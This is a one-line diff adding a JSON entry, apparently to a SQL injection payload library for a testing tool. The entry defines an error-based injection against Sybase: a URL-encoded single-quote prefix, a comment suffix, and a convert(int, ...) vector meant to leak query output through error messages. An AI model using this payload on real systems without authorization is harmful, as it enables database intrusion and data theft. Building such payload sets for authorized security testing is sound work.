@@ -1,0 +1,1 @@
+{"dbms": "sybase", "technique": "error", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND 1=convert(int,({Q}))", "comment": "sybase error: url-enc single"}
